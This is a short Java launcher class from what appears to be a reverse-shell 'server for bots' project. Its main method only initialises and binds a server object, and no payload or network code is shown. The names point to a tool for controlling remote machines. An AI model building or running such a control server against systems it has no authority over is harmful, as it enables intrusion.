package com.github.kvac.reverseshell.reverseshell.server;

import com.github.kvac.reverseshell.reverseshell.server.header.SERVERHEADER;

public class InitServer {

    public static void main(String[] args) {
        SERVERHEADER.getSERVER_FOR_BOTS().init();
        try {
            SERVERHEADER.getSERVER_FOR_BOTS().bind();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
